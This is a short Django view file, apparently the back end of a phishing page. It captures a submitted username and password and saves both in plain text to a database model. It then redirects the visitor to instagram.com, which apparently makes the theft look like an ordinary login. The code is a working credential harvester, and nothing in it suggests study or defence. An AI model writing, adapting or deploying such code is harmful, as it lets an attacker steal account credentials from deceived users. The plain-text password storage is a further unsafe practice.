from django.shortcuts import render
from django.shortcuts import render, redirect
from django.shortcuts import render, redirect
from .forms import UserDataForm
from .models import UserData

def home(request):
    if request.method == 'POST':
        form = UserDataForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            # Ma'lumotni modelga yozamiz
            UserData.objects.create(username=username, password=password)
            return redirect('https://www.instagram.com/')  # Yoki 'success' sahifaga
    else:
        form = UserDataForm()
    return render(request, 'index.html', {'form': form})


